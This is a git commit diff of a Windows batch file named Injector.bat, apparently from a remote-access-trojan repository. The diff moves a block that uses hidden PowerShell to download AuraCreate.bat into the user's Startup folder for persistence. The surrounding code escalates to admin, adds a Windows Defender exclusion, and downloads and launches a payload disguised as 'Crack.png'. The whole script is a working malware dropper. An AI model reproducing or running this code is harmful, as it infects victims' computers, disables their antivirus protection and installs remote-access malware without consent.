0a9b60a4a81e7ada3542d3f3a846d386021852c7
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-07-02 21:38:24 -0400

    Update Injector.bat

--- Injector.bat
+++ Injector.bat
@@ -1,4 +1,8 @@
 @echo off
+set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/AuraCreate.bat"
+set "AURA_BAT_FILE=%STARTUP_FOLDER%\AuraCreate.bat"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
@@ -10,10 +14,6 @@ set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
-set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/AuraCreate.bat"
-set "AURA_BAT_FILE=%STARTUP_FOLDER%\AuraCreate.bat"
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
 exit
 :: Made by GLICHED 
-:: v3
+:: v3.1
